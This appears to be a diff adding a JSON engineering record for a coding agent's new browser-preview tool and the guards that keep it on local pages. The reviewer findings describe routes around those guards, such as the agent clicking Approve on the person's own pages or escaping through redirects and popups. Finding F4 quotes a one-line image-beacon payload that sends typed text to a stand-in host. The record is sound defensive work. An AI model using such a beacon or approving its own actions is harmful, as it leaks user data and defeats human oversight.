@@ -1,0 +1,140 @@
+{
+  "package": "dclab-code-v1.29",
+  "title": "The agent uses the preview: clicks and typing, behind a guard on every request and window",
+  "date": "2026-10-26",
+  "request": "The owner's goal: Claude Code's capabilities; the UI review's next item: the agent can see the preview but not act in it. The owner approved reinstalling Playwright's Chromium for the page tests.",
+  "spec": "docs/UI_REVIEW.md 'What to build next' item 1",
+  "plan": [
+    "a preview.act tool: click, fill, press, wait, then the picture and text",
+    "local pages only, never the person's own pages",
+    "the page tests run on Playwright's Chromium or, without it, the machine's Chrome"
+  ],
+  "decisions": [
+    {
+      "decision": "block every request to another site, images, fonts and scripts included",
+      "why": "anything the agent types could otherwise leave in a beacon; the cost is a picture without remote assets, said in the tool's text"
+    },
+    {
+      "decision": "refuse the person's own ports (DCLab Code, DCLab's server, 4317, 8765, 8777) for every request, not only the first address",
+      "why": "approvals and settings on those pages are the person's; a click there by the agent would be a person's decision made by a model"
+    },
+    {
+      "decision": "route on the browser context, block service workers, check each redirect before following it, close new windows",
+      "why": "page.route misses popups, redirects after the first URL and service-worker requests (Playwright's docs)"
+    },
+    {
+      "decision": "fall back to the installed Google Chrome (fresh profile) when Playwright's Chromium is missing",
+      "why": "a cleanup had deleted Chromium and 19 page tests were silently skipped; Chrome was already on the machine"
+    }
+  ],
+  "change": "dclab-code server/browser.js (new), server/preview_tool.js (act, allowed(), context-wide guard), server/engine.js (DCLab's port refused), tests/page.test.js, tests/units.test.js, web/index.html (icon).",
+  "findings": [
+    {
+      "id": "F1",
+      "source": "reviewer",
+      "defect": "the agent could click on the person's own pages",
+      "scenario": "act on http://127.0.0.1:8765/ or a local app that redirects or links to DCLab Code's port, then click Approve",
+      "cause": "only the first URL was checked, and only against this app's own port",
+      "fix": "allowed() refuses the person's ports for every request, link and redirect",
+      "test": "page test: a link and a redirect to the own port; the Approve click fails; mutation (ports ignored) fails the test",
+      "severity": "behaviour"
+    },
+    {
+      "id": "F2",
+      "source": "reviewer",
+      "defect": "a redirect to another site was followed",
+      "scenario": "a local page answers 302 to a remote host: its picture and text came back",
+      "cause": "page.route sees only the first URL of a redirect chain",
+      "fix": "route.fetch with maxRedirects 0; the Location is checked before the browser follows it",
+      "test": "page test with a stand-in remote that must get zero requests; mutation fails the test",
+      "severity": "behaviour"
+    },
+    {
+      "id": "F3",
+      "source": "reviewer",
+      "defect": "new windows reached another site",
+      "scenario": "window.open or a target=_blank link",
+      "cause": "page.route does not cover new pages",
+      "fix": "context-wide routes; any new window is closed and said",
+      "test": "page test; mutation fails the test",
+      "severity": "behaviour"
+    },
+    {
+      "id": "F4",
+      "source": "reviewer",
+      "defect": "typed text could leave in an image beacon or fetch",
+      "scenario": "fill a field, click: new Image().src='https://x/?d='+value",
+      "cause": "only documents were checked",
+      "fix": "every request to another site is not sent; service workers blocked; the count is said",
+      "test": "page test: the remote stand-in receives nothing",
+      "severity": "privacy"
+    },
+    {
+      "id": "F5",
+      "source": "reviewer",
+      "defect": "a page that keeps leaving was shown as the browser's error page",
+      "scenario": "a meta refresh to a remote host",
+      "cause": "the fallback reload ran the refresh again",
+      "fix": "go back once; if still away, say so with no picture",
+      "test": "page test",
+      "severity": "behaviour"
+    },
+    {
+      "id": "F6",
+      "source": "test",
+      "defect": "after a blocked link, Chrome showed its own error page in place of the app",
+      "scenario": "a link to example.com clicked in a local app",
+      "cause": "Chrome commits an error page for an aborted navigation; Playwright's Chromium did not",
+      "fix": "go back to the local page",
+      "test": "page test on both browsers",
+      "severity": "behaviour"
+    },
+    {
+      "id": "F7",
+      "source": "test",
+      "defect": "the page test file hung for ten minutes after a failure",
+      "scenario": "an assertion failed before the test's servers were closed",
+      "cause": "servers closed only on success",
+      "fix": "close every server in finally",
+      "test": "the failing run then ended",
+      "severity": "flaky"
+    },
+    {
+      "id": "F8",
+      "source": "test",
+      "defect": "real Chrome logged a 404 for the page's icon",
+      "scenario": "every page load",
+      "cause": "no favicon",
+      "fix": "an inline SVG icon",
+      "test": "the first page test (no console errors)",
+      "severity": "behaviour"
+    }
+  ],
+  "measurements": [
+    {
+      "name": "tests",
+      "gate": "every test passes, none skipped",
+      "fixed_before_run": true,
+      "result": "dclab-code 113 of 113; page tests 20 of 20 on Playwright's Chromium, also passing on Google Chrome",
+      "verdict": "pass"
+    },
+    {
+      "name": "mutations",
+      "gate": "the guard test fails when the guard is broken",
+      "fixed_before_run": true,
+      "result": "own ports ignored, redirects unchecked, popups kept: each fails the test",
+      "verdict": "pass"
+    }
+  ],
+  "outcome": "The agent can use a local app it builds, as the person does in the Preview tab, and can never act on the person's own pages or send anything to another site.",
+  "lessons": [
+    "A tool that only looks and a tool that clicks need different guards: give the clicking one the guards of the person's own clicks.",
+    "Check a guard test by breaking the guard; a test that passes on broken code proves nothing.",
+    "Playwright's page.route misses redirects, popups and service workers; route the context."
+  ],
+  "risks": [
+    "no live session has used preview.act with a model yet",
+    "Playwright's Chromium takes 573 MB, more than the 150 MB said to the owner"
+  ],
+  "commits": []
+}
